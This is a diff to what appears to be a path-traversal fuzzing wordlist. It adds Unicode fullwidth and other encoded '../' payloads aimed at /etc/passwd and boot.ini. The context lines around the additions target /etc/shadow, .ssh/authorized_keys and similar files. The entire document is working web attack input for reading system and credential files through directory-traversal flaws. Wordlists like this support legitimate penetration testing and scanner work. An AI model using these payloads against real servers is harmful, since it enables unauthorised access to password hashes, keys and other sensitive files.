@@ -7,6 +7,8 @@
 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini
 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%  25%5c..%25%5c..%00
 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%ef%bd%82%ef%bd%8f%ef%bd%8f%ef%bd%94%e2%80%a4%e2%85%b0%ef%bd%8e%e2%85%b0
+%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%ef%bd%85%ef%bd%94%e2%85%bd%ef%bc%8f%ef%bd%90%ef%bd%81%ef%bd%93%ef%bd%93%ef%bd%97%e2%85%be
 -/etc/pure-ftpd.conf
 ..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
 ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
@@ -15,6 +17,9 @@
 ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
 ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8boot.ini
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bcboot.ini
 ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
 ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
 ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
@@ -604,6 +609,7 @@
 /.sh_history
 /.shosts
 /.ssh/authorized_keys
+///////../../../etc/passwd
 /D:\Program Files\
 /Library/WebServer/Documents/.htaccess
 /Library/WebServer/Documents/default.htm
